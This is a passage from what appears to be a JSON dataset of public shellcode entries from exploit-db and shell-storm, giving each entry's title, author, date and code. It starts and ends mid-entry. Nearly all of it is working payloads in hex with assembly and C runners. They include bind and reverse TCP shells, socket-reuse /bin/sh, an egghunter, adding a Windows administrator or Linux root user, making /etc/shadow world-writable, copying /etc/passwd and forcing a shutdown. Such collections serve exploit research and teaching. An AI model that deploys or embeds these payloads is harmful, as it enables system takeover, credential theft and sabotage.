edi", "*/", "", "// second egg/tag/shellcode", "unsigned char shellcode2[] =", "MARKER", "TAG2", "//SHELLCODE2", "\"\\x5b\\x6a\\x02\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\xb0\\x0b\"", "\"\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x89\"", "\"\\xe2\\x53\\x89\\xe1\\xcd\\x80\"", ";", "/*", "global _start", "section .text", "_start:", "    pop ebx           ; arg1 :: clnt_sockfd", "    push 0x2", "    pop ecx           ; loop from 2 to 0", "dup2loop:", "    mov byte al, 0x3F ; dup2(2)", "    int 0x80", "    dec ecx", "    jns dup2loop      ; loop ends when ecx == -1", "    xor eax, eax", "    mov byte al, 0x0B ; execve(2)", "    push edx          ; null terminator", "    push 0x68732f2f   ; \"hs//\"", "    push 0x6e69622f   ; \"nib/\"", "    mov ebx, esp      ; arg1 :: \"/bin/sh\\0\"", "    push edx          ; null terminator", "    mov edx, esp      ; arg3 :: envp = NULL array", "    push ebx", "    mov ecx, esp      ; arg2 :: argv array (ptr to string)", "    int 0x80", "*/", "", "unsigned char egghunter[] =", "\"\\x6a\\x02\\x59\\x57\\x51\\x31\\xc9\\x66\\x81\\xc9\\xff\\x0f\\x41\\x6a\\x43\"", "\"\\x58\\xcd\\x80\\x3c\\xf2\\x74\\xf1\\xb8\"    MARKER    \"\\x89\\xcf\\xaf\"", "\"\\x75\\xec\\x89\\xcb\\x59\\x20\\xc8\\xaf\\x51\\x89\\xd9\\x75\\xe1\\x59\\xe2\"", "\"\\xd5\\xff\\xe7\";", "/*", "    global _start", "    section .text", "    _start:", "        push byte 0x2", "        pop ecx             ; number of eggs", "    eggLoop:", "        push edi            ; memory location of ecx-th piece; first of", "                            ; these is meaningless", "        push ecx            ; save counter", "        xor ecx, ecx        ; initialize ecx for memory search", "    fillOnes:", "        or cx, 0xfff", "    shiftUp:", "        inc ecx", "        push byte 0x43      ; sigaction(2)", "        pop eax", "        int 0x80", "        cmp al, 0xf2", "        jz fillOnes", "        mov eax, 0x59935193 ; marker", "        mov edi, ecx", "        scasd               ; advances edi by 0x4 if there is a match;", "                            ; assumes direction flag (DF) is not set", "        jnz shiftUp", "        mov ebx, ecx        ; save off ecx in case we need to keep looking", "        pop ecx             ; restore counter", "        and al, cl          ; tag in eax", "        scasd", "        push ecx", "        mov ecx, ebx", "        jnz shiftUp", "        pop ecx", "        loop eggLoop", "        jmp edi", "*/", "", "void main() {", "    printf(\"egghunter length:   %d\\n\", sizeof(egghunter)-1);", "    printf(\"shellcode1 length:  %d\\n\", sizeof(shellcode1)-1);", "    printf(\"shellcode2 length:  %d\\n\", sizeof(shellcode2)-1);", "    ((int(*)())egghunter)();", "}"]},
{"Title": "Windows - MessageBox + Null-Free Shellcode (113 bytes)", "Author": "Giuseppe D'Amore", "Published": ": 2013-10-16", "Platform": "Windows", "Download": "https://old.exploit-db.com/download/28996.c", "View": "https://old.exploit-db.com/raw/28996/", "code": ["/*", "User32-free Messagebox Shellcode for any Windows version", "========================================================", "", "Title:    \t   User32-free Messagebox Shellcode for any Windows version", "Release date:      16/10/2013", "Author:\t\t   Giuseppe D'Amore (http://it.linkedin.com/pub/giuseppe-d-amore/69/37/66b)", "Size: \t\t   113 byte (NULL free)", "Tested on: \t   Win8,Win7,WinVista,WinXP,Win2kPro,Win2k8,Win2k8R2,Win2k3", "*/", "", "", "char shellcode[] = \"\\x31\\xd2\\xb2\\x30\\x64\\x8b\\x12\\x8b\\x52\\x0c\\x8b\\x52\\x1c\\x8b\\x42\"", "\t\t   \"\\x08\\x8b\\x72\\x20\\x8b\\x12\\x80\\x7e\\x0c\\x33\\x75\\xf2\\x89\\xc7\\x03\"", "\t\t   \"\\x78\\x3c\\x8b\\x57\\x78\\x01\\xc2\\x8b\\x7a\\x20\\x01\\xc7\\x31\\xed\\x8b\"", "\t           \"\\x34\\xaf\\x01\\xc6\\x45\\x81\\x3e\\x46\\x61\\x74\\x61\\x75\\xf2\\x81\\x7e\"", "\t\t   \"\\x08\\x45\\x78\\x69\\x74\\x75\\xe9\\x8b\\x7a\\x24\\x01\\xc7\\x66\\x8b\\x2c\"", "\t\t   \"\\x6f\\x8b\\x7a\\x1c\\x01\\xc7\\x8b\\x7c\\xaf\\xfc\\x01\\xc7\\x68\\x79\\x74\"", "                   \"\\x65\\x01\\x68\\x6b\\x65\\x6e\\x42\\x68\\x20\\x42\\x72\\x6f\\x89\\xe1\\xfe\"", "\t\t   \"\\x49\\x0b\\x31\\xc0\\x51\\x50\\xff\\xd7\";", " ", "", "int main(int argc, char **argv){int (*f)();f = (int (*)())shellcode;(int)(*f)();}"]},
{"Title": "Linux/x64 - Read /etc/passwd + Write To /tmp/outfile Shellcode (118 bytes)", "Author": "Chris Higgins", "Published": ": 2014-03-27", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-867.php", "View": null, "code": ["/*", "Reads data from /etc/passwd to /tmp/outfile", "No null bytes", "", "Author: Chris Higgins <chris@chigs.me>", "        @ch1gg1ns -- github.com/chiggins -- http://chigstuff.com/blog/2014/03/29/my-first-shellcode/", "        chigstuff.com", "Date:   3-27-2014", "Size:   118 bytes", "Tested: ArchLinux x86_64 3.13.6-1", "Assembly:", "        xor rax, rax", "        mov al, 2", "        xor rdi, rdi", "        mov rbx, 0x647773", "        push rbx", "        mov rbx, 0x7361702f6374652f", "        push rbx", "        lea rdi, [rsp]", "        xor rsi, rsi", "        syscall", "        mov rbx, rax", "        xor rax, rax", "        mov rdi, rbx", "        mov rsi, rsp", "        mov dx, 0xFFFF", "        syscall", "        mov r8, rax", "        mov rax, rsp", "        xor rbx, rbx", "        push rbx", "        mov rbx, 0x656c6966", "        push rbx", "        mov rbx, 0x74756f2f706d742f", "        push rbx", "        mov rbx, rax", "        xor rax, rax", "        mov al, 2", "        lea rdi, [rsp]", "        xor rsi, rsi", "        push 0x66", "        pop si", "        syscall", "        mov rdi, rax", "        xor rax, rax", "        mov al, 1", "        lea rsi, [rbx]", "        xor rdx, rdx", "        mov rdx, r8", "        syscall", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "char shellcode[] = \"\\x48\\x31\\xc0\\xb0\\x02\\x48\\x31\\xff\\xbb\\x73\\x77\\x64\\x00\\x53\\x48\\xbb\\x2f\\x65\\x74\\x63\\x70\\x61\\x73\\x53\\x48\\x8d\\x3c\\x24\\x48\\x31\\xf6\\x0f\\x05\\x48\\x89\\xc3\\x48\\x31\\xc0\\x48\\x89\\xdf\\x48\\x89\\xe6\\x66\\xba\\xff\\xff\\x0f\\x05\\x49\\x89\\xc0\\x48\\x89\\xe0\\x48\\x31\\xdb\\x53\\xbb\\x66\\x69\\x6c\\x65\\x53\\x48\\xbb\\x2f\\x74\\x6d\\x70\\x6f\\x75\\x74\\x53\\x48\\x89\\xc3\\x48\\x31\\xc0\\xb0\\x02\\x48\\x8d\\x3c\\x24\\x48\\x31\\xf6\\x6a\\x66\\x66\\x5e\\x0f\\x05\\x48\\x89\\xc7\\x48\\x31\\xc0\\xb0\\x01\\x48\\x8d\\x33\\x48\\x31\\xd2\\x4c\\x89\\xc2\\x0f\\x05\";", "", "int main() {", "    printf(\"len: %d bytes\", sizeof shellcode);", "    (*(void (*)()) shellcode);", "    return 0;", "}"]},
{"Title": "Linux/x86 - setreuid() + execve(/usr/bin/python) Shellcode (54 bytes)", "Author": "Ali Razmjoo", "Published": ": 2014-05-08", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-886.php", "View": null, "code": ["# Title: Shellcode Linux x86 [54Bytes] Run /usr/bin/python | setreuid(),execve()", "# Date: 8/5/2014", "# Author: Ali Razmjoo", "# Tested on: kali-linux-1.0.4-i386 [3.7-trunk-686-pae #1 SMP Debian 3.7.2-0+kali8 i686 GNU/Linux ]", "", "/*", "Ali Razmjoo , Ali.Razmjoo1994@Gmail.Com", "Shellcode Linux x86 Run /usr/bin/python | setreuid(),execve()", "Shellcode Length: 54", "", "", "00000000 <_start>:", "   0:   31 c0                   xor    %eax,%eax", "   2:   b0 46                   mov    $0x46,%al", "   4:   31 db                   xor    %ebx,%ebx", "   6:   31 c9                   xor    %ecx,%ecx", "   8:   cd 80                   int    $0x80", "   a:   eb 16                   jmp    22 <last>", "0000000c <first>:", "   c:   5b                      pop    %ebx", "   d:   31 c0                   xor    %eax,%eax", "   f:   88 43 0f                mov    %al,0xf(%ebx)", "  12:   89 5b 10                mov    %ebx,0x10(%ebx)", "  15:   89 43 14                mov    %eax,0x14(%ebx)", "  18:   b0 0b                   mov    $0xb,%al", "  1a:   8d 4b 10                lea    0x10(%ebx),%ecx", "  1d:   8d 53 14                lea    0x14(%ebx),%edx", "  20:   cd 80                   int    $0x80", "00000022 <last>:", "  22:   e8 e5 ff ff ff          call   c <first>", "  27:   2f                      das", "  28:   75 73                   jne    9d <last+0x7b>", "  2a:   72 2f                   jb     5b <last+0x39>", "  2c:   62 69 6e                bound  %ebp,0x6e(%ecx)", "  2f:   2f                      das", "  30:   70 79                   jo     ab <last+0x89>", "  32:   74 68                   je     9c <last+0x7a>", "  34:   6f                      outsl  %ds:(%esi),(%dx)", "  35:   6e                      outsb  %ds:(%esi),(%dx)", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "char sc[] = \"\\x31\\xc0\\xb0\\x46\\x31\\xdb\\x31\\xc9\\xcd\\x80\\xeb\\x16\\x5b\\x31\\xc0\\x88\\x43\\x0f\\x89\\x5b\\x10\\x89\\x43\\x14\\xb0\\x0b\\x8d\\x4b\\x10\\x8d\\x53\\x14\\xcd\\x80\\xe8\\xe5\\xff\\xff\\xff\\x2f\\x75\\x73\\x72\\x2f\\x62\\x69\\x6e\\x2f\\x70\\x79\\x74\\x68\\x6f\\x6e\";", "", "int main(void)", "{", "    fprintf(stdout,\"Length: %d\\n\\n\",strlen(sc));", "    (*(void(*)()) sc)();", "}"]},
{"Title": "Windows - Add Administrator User (BroK3n/BroK3n) + Null-Free Shellcode (194 bytes)", "Author": "Giuseppe D'Amore", "Published": ": 2014-06-22", "Platform": "Windows", "Download": "http://shell-storm.org/shellcode/files/shellcode-874.php", "View": null, "code": ["Add Admin User Shellcode (194 bytes) - Any Windows Version", "========================================================", "", "Title:       Add Admin User Shellcode (194 bytes) - Any Windows Version", "Release date:      21/06/2014", "Author:   Giuseppe D'Amore (http://it.linkedin.com/pub/giuseppe-d-amore/69/37/66b)", "Size:   194 byte (NULL free)", "Tested on:   Win8,Win7,WinVista,WinXP,Win2kPro,Win2k8,Win2k8R2,Win2k3", "Username: BroK3n", "Password: BroK3n", "", "char shellcode[] = \"\\x31\\xd2\\xb2\\x30\\x64\\x8b\\x12\\x8b\\x52\\x0c\\x8b\\x52\\x1c\\x8b\\x42\"", "\t  \"\\x08\\x8b\\x72\\x20\\x8b\\x12\\x80\\x7e\\x0c\\x33\\x75\\xf2\\x89\\xc7\\x03\"", "\t  \"\\x78\\x3c\\x8b\\x57\\x78\\x01\\xc2\\x8b\\x7a\\x20\\x01\\xc7\\x31\\xed\\x8b\"", "\t  \"\\x34\\xaf\\x01\\xc6\\x45\\x81\\x3e\\x57\\x69\\x6e\\x45\\x75\\xf2\\x8b\\x7a\"", "\t  \"\\x24\\x01\\xc7\\x66\\x8b\\x2c\\x6f\\x8b\\x7a\\x1c\\x01\\xc7\\x8b\\x7c\\xaf\"", "\t  \"\\xfc\\x01\\xc7\\x68\\x4b\\x33\\x6e\\x01\\x68\\x20\\x42\\x72\\x6f\\x68\\x2f\"", "\t  \"\\x41\\x44\\x44\\x68\\x6f\\x72\\x73\\x20\\x68\\x74\\x72\\x61\\x74\\x68\\x69\"", "\t  \"\\x6e\\x69\\x73\\x68\\x20\\x41\\x64\\x6d\\x68\\x72\\x6f\\x75\\x70\\x68\\x63\"", "\t  \"\\x61\\x6c\\x67\\x68\\x74\\x20\\x6c\\x6f\\x68\\x26\\x20\\x6e\\x65\\x68\\x44\"", "\t  \"\\x44\\x20\\x26\\x68\\x6e\\x20\\x2f\\x41\\x68\\x72\\x6f\\x4b\\x33\\x68\\x33\"", "\t  \"\\x6e\\x20\\x42\\x68\\x42\\x72\\x6f\\x4b\\x68\\x73\\x65\\x72\\x20\\x68\\x65\"", "\t  \"\\x74\\x20\\x75\\x68\\x2f\\x63\\x20\\x6e\\x68\\x65\\x78\\x65\\x20\\x68\\x63\"", "\t  \"\\x6d\\x64\\x2e\\x89\\xe5\\xfe\\x4d\\x53\\x31\\xc0\\x50\\x55\\xff\\xd7\";", "", "", "int main(int argc, char **argv){int (*f)();f = (int (*)())shellcode;(int)(*f)();}"]},
{"Title": "Linux/x86 - chmod 0777 /etc/shadow + Obfuscated Shellcode (51 bytes)", "Author": "Osanda Malith Jayathissa", "Published": ": 2014-06-22", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-875.php", "View": null, "code": ["/*", "; Title:    chmod 0777 /etc/shadow (a bit obfuscated) Shellcode - 51 Bytes", "; Platform: linux/x86", "; Date:     2014-06-22", "; Author:   Osanda Malith Jayathissa (@OsandaMalith)", "", "section .text", "global _start", "", "_start: ", "mov ebx, eax", "xor eax, ebx", "push dword eax", "mov esi, 0x563a1f3e", "add esi, 0x21354523", "mov dword [esp-4], esi", "mov dword [esp-8], 0x68732f2f", "mov dword [esp-12], 0x6374652f", "sub esp, 12", "mov    ebx,esp", "push word  0x1ff", "pop    cx", "mov    al,0xf", "int    0x80", "", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char code[] = \\", "\"\\x89\\xc3\\x31\\xd8\\x50\\xbe\\x3e\\x1f\"", "\"\\x3a\\x56\\x81\\xc6\\x23\\x45\\x35\\x21\"", "\"\\x89\\x74\\x24\\xfc\\xc7\\x44\\x24\\xf8\"", "\"\\x2f\\x2f\\x73\\x68\\xc7\\x44\\x24\\xf4\"", "\"\\x2f\\x65\\x74\\x63\\x83\\xec\\x0c\\x89\"", "\"\\xe3\\x66\\x68\\xff\\x01\\x66\\x59\\xb0\"", "\"\\x0f\\xcd\\x80\";", "", "int", "main() {", "", "       printf(\"Shellcode Length:  %d\\n\", strlen(code));", "       int (*ret)() = (int(*)())code;", "       ret();", "", "return 0;", "}"]},
{"Title": "Linux/x64 - shutdown -h now Shellcode (65 bytes)", "Author": "Osanda Malith Jayathissa", "Published": ": 2014-06-27", "Platform": "Linux_x86-64", "Download": "http://shell-storm.org/shellcode/files/shellcode-877.php", "View": null, "code": ["/*", "; Title: shutdown -h now x86_64 Shellcode - 65 bytes", "; Platform: linux/x86_64", "; Date: 2014-06-27", "; Author: Osanda Malith Jayathissa (@OsandaMalith)", "", "section .text", "", "global _start", "", "_start:", "", "xor rax, rax", "xor rdx, rdx ", "", "push rax", "push byte 0x77", "push word 0x6f6e ; now", "mov rbx, rsp", "", "push rax", "push word 0x682d ;-h", "mov rcx, rsp", "", "push rax", "mov r8, 0x2f2f2f6e6962732f ; /sbin/shutdown", "mov r10, 0x6e776f6474756873", "push r10", "push r8", "mov rdi, rsp", "", "push rdx", "push rbx", "push rcx", "push rdi", "mov rsi, rsp", "", "add rax, 59", "syscall", "", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char code[] =  \"\\x48\\x31\\xc0\\x48\\x31\\xd2\\x50\\x6a\"", "\"\\x77\\x66\\x68\\x6e\\x6f\\x48\\x89\\xe3\"", "\"\\x50\\x66\\x68\\x2d\\x68\\x48\\x89\\xe1\"", "\"\\x50\\x49\\xb8\\x2f\\x73\\x62\\x69\\x6e\"", "\"\\x2f\\x2f\\x2f\\x49\\xba\\x73\\x68\\x75\"", "\"\\x74\\x64\\x6f\\x77\\x6e\\x41\\x52\\x41\"", "\"\\x50\\x48\\x89\\xe7\\x52\\x53\\x51\\x57\"", "\"\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\"", "\"\\x05\";", "", "int", "main() {", "", "printf(\"Shellcode Length:  %d\\n\", (int)strlen(code));", "int (*ret)() = (int(*)())code;", "ret();", "", "return 0;", "}"]},
{"Title": "Linux/x86 - shutdown -h now Shellcode (56 bytes)", "Author": "Osanda Malith Jayathissa", "Published": ": 2014-06-27", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-876.php", "View": null, "code": ["/*", "; Title: shutdown -h now Shellcode - 56 bytes", "; Date: 2014-06-27", "; Platform: linux/x86", "; Author: Osanda Malith Jayathissa (@OsandaMalith)", "", "Disassembly of section .text:", "", "08048060 <_start>:", "8048060:    31 c0                   xor    eax,eax", "8048062:    31 d2                   xor    edx,edx", "8048064:    50                      push   eax", "8048065:    66 68 2d 68             pushw  0x682d", "8048069:    89 e7                   mov    edi,esp", "804806b:    50                      push   eax", "804806c:    6a 6e                   push   0x6e", "804806e:    66 c7 44 24 01 6f 77    mov    WORD PTR [esp+0x1],0x776f", "8048075:    89 e7                   mov    edi,esp", "8048077:    50                      push   eax", "8048078:    68 64 6f 77 6e          push   0x6e776f64", "804807d:    68 73 68 75 74          push   0x74756873", "8048082:    68 6e 2f 2f 2f          push   0x2f2f2f6e", "8048087:    68 2f 73 62 69          push   0x6962732f", "804808c:    89 e3                   mov    ebx,esp", "804808e:    52                      push   edx", "804808f:    56                      push   esi", "8048090:    57                      push   edi", "8048091:    53                      push   ebx", "8048092:    89 e1                   mov    ecx,esp", "8048094:    b0 0b                   mov    al,0xb", "8048096:    cd 80                   int    0x80", "", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "unsigned char code[] =  \"\\x31\\xc0\\x31\\xd2\\x50\\x66\\x68\\x2d\"", "\"\\x68\\x89\\xe7\\x50\\x6a\\x6e\\x66\\xc7\"", "\"\\x44\\x24\\x01\\x6f\\x77\\x89\\xe7\\x50\"", "\"\\x68\\x64\\x6f\\x77\\x6e\\x68\\x73\\x68\"", "\"\\x75\\x74\\x68\\x6e\\x2f\\x2f\\x2f\\x68\"", "\"\\x2f\\x73\\x62\\x69\\x89\\xe3\\x52\\x56\"", "\"\\x57\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\";", "", "int", "main() {", "", "printf(\"Shellcode Length:  %d\\n\", (int)strlen(code));", "int (*ret)() = (int(*)())code;", "ret();", "", "return 0;", "}"]},
{"Title": "Linux/x86 - Bind (1337/TCP) Shell Shellcode (89 bytes)", "Author": "Julien Ahrens", "Published": ": 2014-07-13", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-882.php", "View": null, "code": ["/* ", "*  Title:    Shell Bind TCP Shellcode Port 1337 - 89 bytes", "*  Platform: Linux/x86", "*  Date:     2014-07-13", "*  Author:   Julien Ahrens (@MrTuxracer)", "*  Website:  http://www.rcesecurity.com ", "*", "*  Disassembly of section .text:", "*  00000000 <_start>:", "*  0:   6a 66                push   0x66", "*  2:   58                   pop    eax", "*  3:   6a 01                push   0x1", "*  5:   5b                   pop    ebx", "*  6:   31 f6                xor    esi,esi", "*  8:   56                   push   esi", "*  9:   53                   push   ebx", "*  a:   6a 02                push   0x2", "*  c:   89 e1                mov    ecx,esp", "*  e:   cd 80                int    0x80", "* 10:   5f                   pop    edi", "* 11:   97                   xchg   edi,eax", "* 12:   93                   xchg   ebx,eax", "* 13:   b0 66                mov    al,0x66", "* 15:   56                   push   esi", "* 16:   66 68 05 39          pushw  0x3905", "* 1a:   66 53                push   bx", "* 1c:   89 e1                mov    ecx,esp", "* 1e:   6a 10                push   0x10", "* 20:   51                   push   ecx", "* 21:   57                   push   edi", "* 22:   89 e1                mov    ecx,esp", "* 24:   cd 80                int    0x80", "* 26:   b0 66                mov    al,0x66", "* 28:   b3 04                mov    bl,0x4", "* 2a:   56                   push   esi", "* 2b:   57                   push   edi", "* 2c:   89 e1                mov    ecx,esp", "* 2e:   cd 80                int    0x80", "* 30:   b0 66                mov    al,0x66", "* 32:   43                   inc    ebx", "* 33:   56                   push   esi", "* 34:   56                   push   esi", "* 35:   57                   push   edi", "* 36:   89 e1                mov    ecx,esp", "* 38:   cd 80                int    0x80", "* 3a:   59                   pop    ecx", "* 3b:   59                   pop    ecx", "* 3c:   b1 02                mov    cl,0x2", "* 3e:   93                   xchg   ebx,eax", "*", "* 0000003f <loop>:", "* 3f:   b0 3f                mov    al,0x3f", "* 41:   cd 80                int    0x80", "* 43:   49                   dec    ecx", "* 44:   79 f9                jns    3f <loop>", "* 46:   b0 0b                mov    al,0xb", "* 48:   68 2f 2f 73 68       push   0x68732f2f", "* 4d:   68 2f 62 69 6e       push   0x6e69622f", "* 52:   89 e3                mov    ebx,esp", "* 54:   41                   inc    ecx", "* 55:   89 ca                mov    edx,ecx", "* 57:   cd 80                int    0x80", "*/", "", "#include <stdio.h>", "", "unsigned char shellcode[] = \\", "\"\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x31\\xf6\\x56\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x5f\\x97\\x93\\xb0\\x66\\x56\\x66\\x68\\x05\\x39\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x56\\x57\\x89\\xe1\\xcd\\x80\\xb0\\x66\\x43\\x56\\x56\\x57\\x89\\xe1\\xcd\\x80\\x59\\x59\\xb1\\x02\\x93\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x41\\x89\\xca\\xcd\\x80\";", "", "main()", "{", "printf(\"Shellcode Length:  %d\\n\", sizeof(shellcode) - 1);", "int (*ret)() = (int(*)())shellcode;", "ret();", "}"]},
{"Title": "Linux/x86 - execve(/bin/sh) + Socket Re-Use Shellcode (50 bytes)", "Author": "ZadYree", "Published": ": 2014-07-14", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-881.php", "View": null, "code": ["/* Socket Re-use Combo for linux x86 systems by ZadYree -- 50 bytes", " * <zadyree@tuxfamily.org>", " *", " * Made using sockfd trick + dup2(0,0), dup2(0,1), dup2(0,2) +", " * execve /bin/sh", " *", " * Thanks: Charles Stevenson, ipv, 3LRVS research team", " *", " * gcc -o socket_reuse socket_reuse.c -z execstack", " */", "", "char shellcode[]= /* We use sys_dup(2) to get the previous attributed sockfd */", "\"\\x6a\\x02\"      // push 0x2", "\"\\x5b\"          // pop ebx", "\"\\x6a\\x29\"      // push 0x29", "\"\\x58\"          // pop eax", "\"\\xcd\\x80\"      // int 0x80 -> call dup(2)", "\"\\x48\"          // dec eax", "/* Now EAX = our Socket File Descriptor */", "", "\"\\x89\\xc6\"      // mov esi, eax", "", "/* dup2(fd,0); dup2(fd,1); dup2(fd,2); */", "\"\\x31\\xc9\"                  // xor    %ecx,%ecx", "\"\\x56\"                      // push   %esi", "\"\\x5b\"                      // pop    %ebx", "// loop:", "\"\\x6a\\x3f\"                  // push   $0x3f", "\"\\x58\"                      // pop    %eax", "\"\\xcd\\x80\"                  // int    $0x80", "\"\\x41\"                      // inc    %ecx", "\"\\x80\\xf9\\x03\"              // cmp    $0x3,%cl", "\"\\x75\\xf5\"                  // jne    80483e8 <loop>", "", "/* execve /bin/sh by ipv */", "\"\\x6a\\x0b\"                  // push byte 0xb", "\"\\x58\"                      // pop eax", "\"\\x99\"                      // cdq", "\"\\x52\"                      // push edx", "\"\\x31\\xf6\"                  // xor esi, esi - We add those instructions", "\"\\x56\"                      // push esi     - to clean up the arg stack", "\"\\x68\\x2f\\x2f\\x73\\x68\"      // push dword 0x68732f2f", "\"\\x68\\x2f\\x62\\x69\\x6e\"      // push dword 0x6e69922f", "\"\\x89\\xe3\"                  // mov ebx, esp", "\"\\x31\\xc9\"                  // xor ecx, ecx", "\"\\xcd\\x80\";                 // int 0x80", ";", "", "/* ", "", "shellcode[]=", "\"\\x6a\\x02\\x5b\\x6a\\x29\\x58\\xcd\\x80\\x48\\x89\\xc6\"", "\"\\x31\\xc9\\x56\\x5b\\x6a\\x3f\\x58\\xcd\\x80\\x41\\x80\"", "\"\\xf9\\x03\\x75\\xf5\\x6a\\x0b\\x58\\x99\\x52\\x31\\xf6\"", "\"\\x56\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\"", "\"\\x89\\xe3\\x31\\xc9\\xcd\\x80\";", "", "*/", "", "", "int main(void)", "{", "  printf(\"Shellcode length: %d\\n\", strlen(shellcode));", "  (*(void(*)()) shellcode)();  ", "  return 0;", "}"]},
{"Title": "Linux/x86 - Reverse (127.1.1.1:1337/TCP) Shell Shellcode (74 bytes)", "Author": "Julien Ahrens", "Published": ": 2014-07-25", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-883.php", "View": null, "code": ["/* ", "*  Title:    Shell Reverse TCP Shellcode - 74 bytes", "*  Platform: Linux/x86", "*  Date:     2014-07-25", "*  Author:   Julien Ahrens (@MrTuxracer)", "*  Website:  http://www.rcesecurity.com ", "*", "* Disassembly of section .text:", "*  00000000 <_start>:", "*  0:   6a 66                push   0x66", "*  2:   58                   pop    eax", "*  3:   6a 01                push   0x1", "*  5:   5b                   pop    ebx", "*  6:   31 d2                xor    edx,edx", "*  8:   52                   push   edx", "*  9:   53                   push   ebx", "*  a:   6a 02                push   0x2", "*  c:   89 e1                mov    ecx,esp", "*  e:   cd 80                int    0x80", "* 10:   92                   xchg   edx,eax", "* 11:   b0 66                mov    al,0x66", "* 13:   68 7f 01 01 01       push   0x101017f <ip: 127.1.1.1", "* 18:   66 68 05 39          pushw  0x3905 <port: 1337", "* 1c:   43                   inc    ebx", "* 1d:   66 53                push   bx", "* 1f:   89 e1                mov    ecx,esp", "* 21:   6a 10                push   0x10", "* 23:   51                   push   ecx", "* 24:   52                   push   edx", "* 25:   89 e1                mov    ecx,esp", "* 27:   43                   inc    ebx", "* 28:   cd 80                int    0x80", "* 2a:   6a 02                push   0x2", "* 2c:   59                   pop    ecx", "* 2d:   87 da                xchg   edx,ebx", "*", "* 0000002f <loop>:", "* 2f:   b0 3f                mov    al,0x3f", "* 31:   cd 80                int    0x80", "* 33:   49                   dec    ecx", "* 34:   79 f9                jns    2f <loop>", "* 36:   b0 0b                mov    al,0xb", "* 38:   41                   inc    ecx", "* 39:   89 ca                mov    edx,ecx", "* 3b:   52                   push   edx", "* 3c:   68 2f 2f 73 68       push   0x68732f2f", "* 41:   68 2f 62 69 6e       push   0x6e69622f", "* 46:   89 e3                mov    ebx,esp", "* 48:   cd 80                int    0x80", "*/", "", "#include <stdio.h>", "", "unsigned char shellcode[] = \\", "\"\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x31\\xd2\\x52\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x92\\xb0\\x66\\x68\\x7f\\x01\\x01\\x01\\x66\\x68\\x05\\x39\\x43\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x52\\x89\\xe1\\x43\\xcd\\x80\\x6a\\x02\\x59\\x87\\xda\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\xb0\\x0b\\x41\\x89\\xca\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xcd\\x80\";", "", "main()", "{", "printf(\"Shellcode Length:  %d\\n\", sizeof(shellcode) - 1);", "int (*ret)() = (int(*)())shellcode;", "ret();", "}"]},
{"Title": "Linux/x86 - chmod 777 (/etc/passwd + /etc/shadow) + Add Root User (ALI/ALI) To /etc/passwd + Execute /bin/sh Shellcode (378 bytes)", "Author": "Ali Razmjoo", "Published": ": 2014-08-04", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-885.php", "View": null, "code": ["/*# Exploit Title: Shellcode Linux x86 chmod(777 /etc/passwd and /etc/shadow) && (Add new root user [ALI] with password [ALI] for ssh) && Execute /bin/sh ", "# Date: 4/8/2014", "# Exploit Author: Ali Razmjoo", "# Tested on: kali-linux-1.0.4-i386 [3.7-trunk-686-pae #1 SMP Debian 3.7.2-0+kali8 i686 GNU/Linux ]", "*/", "/*", "Ali Razmjoo , Ali.Razmjoo1994@Gmail.Com", "Shellcode Linux x86 chmod(777 /etc/passwd and /etc/shadow) && (Add new root user [ALI] with password [ALI] for ssh) && Setreuid() , Execute /bin/sh ", "length: 378 bytes", "chmod('/etc/passwd',777)", "chmod('/etc/shadow',777)", "open passwd , and write new root user with passwrd ( user: ALI pass: ALI ) , close passwd", "setreuid() , execve('/bin/sh')", "", "", "00000000 <_start>:", "   0:\t31 c0                \txor    %eax,%eax", "   2:\t31 db                \txor    %ebx,%ebx", "   4:\t6a 0f                \tpush   $0xf", "   6:\t58                   \tpop    %eax", "   7:\t68 6a 73 77 64       \tpush   $0x6477736a", "   c:\t5b                   \tpop    %ebx", "   d:\tc1 eb 08             \tshr    $0x8,%ebx", "  10:\t53                   \tpush   %ebx", "  11:\t68 2f 70 61 73       \tpush   $0x7361702f", "  16:\t68 2f 65 74 63       \tpush   $0x6374652f", "  1b:\t89 e3                \tmov    %esp,%ebx", "  1d:\t68 41 41 ff 01       \tpush   $0x1ff4141", "  22:\t59                   \tpop    %ecx", "  23:\tc1 e9 08             \tshr    $0x8,%ecx", "  26:\tc1 e9 08             \tshr    $0x8,%ecx", "  29:\tcd 80                \tint    $0x80", "  2b:\t6a 0f                \tpush   $0xf", "  2d:\t58                   \tpop    %eax", "  2e:\t68 6a 64 6f 77       \tpush   $0x776f646a", "  33:\t5b                   \tpop    %ebx", "  34:\tc1 eb 08             \tshr    $0x8,%ebx", "  37:\t53                   \tpush   %ebx", "  38:\t68 2f 